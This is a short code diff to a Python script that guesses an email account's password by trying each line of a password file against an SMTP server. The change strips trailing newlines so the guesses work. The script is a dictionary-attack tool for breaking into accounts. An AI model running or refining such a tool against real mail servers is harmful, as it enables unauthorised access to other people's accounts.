@@ -11,7 +11,8 @@ passwords = open(passfile,"r") #Opening the password file
 #Foreach lines of password in input file
 for password in passwords:
 	try:#Trying to login and if the password matches.
-		smtpserver.login(username,password)#Then print the correct password.
+		# rsritp() to remove newline character '\n' or '\r\n'.
+		smtpserver.login(username,password.rstrip())#Then print the correct password.
 		print("[+] Password found! %s" % password)break; #Break the loop
 	except smtplib.SMTPAuthenticationError:# and if the password is wrong then.
 		print("[!] Password Incorrect %s" % password)
